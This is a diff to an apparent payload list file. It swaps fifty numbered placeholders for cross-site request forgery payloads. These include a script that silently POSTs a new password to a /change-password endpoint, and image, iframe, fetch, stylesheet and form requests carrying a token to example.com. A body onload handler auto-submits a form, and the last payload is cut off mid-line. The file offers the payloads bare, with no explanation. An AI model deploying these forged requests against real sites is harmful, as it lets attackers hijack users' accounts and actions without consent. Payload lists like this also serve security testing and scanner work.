@@ -1,50 +1,32 @@
-payload1
-payload2
-payload3
-payload4
-payload5
-payload6
-payload7
-payload8
-payload9
-payload10
-payload11
-payload12
-payload13
-payload14
-payload15
-payload16
-payload17
-payload18
-payload19
-payload20
-payload21
-payload22
-payload23
-payload24
-payload25
-payload26
-payload27
-payload28
-payload29
-payload30
-payload31
-payload32
-payload33
-payload34
-payload35
-payload36
-payload37
-payload38
-payload39
-payload40
-payload41
-payload42
-payload43
-payload44
-payload45
-payload46
-payload47
-payload48
-payload49
-payload50
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/change-password", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("password=newpassword");
+</script>
+
+<script>
+    var img = new Image();
+    img.src = "http://example.com/csrf?token=12345";
+</script>
+
+<form action="http://example.com/csrf" method="POST">
+    <input type="hidden" name="token" value="12345">
+    <input type="submit" value="Submit">
+</form>
+
+<img src="http://example.com/csrf?token=12345" />
+
+<script>
+    fetch("http://example.com/csrf", {
+        method: "POST",
+        body: new URLSearchParams("token=12345")
+    });
+</script>
+
+<iframe src="http://example.com/csrf?token=12345"></iframe>
+
+<link rel="stylesheet" href="http://example.com/csrf?token=12345">
+
+<body onload="document.forms[0].submit()">
+    <form action="http://example.com/csrf
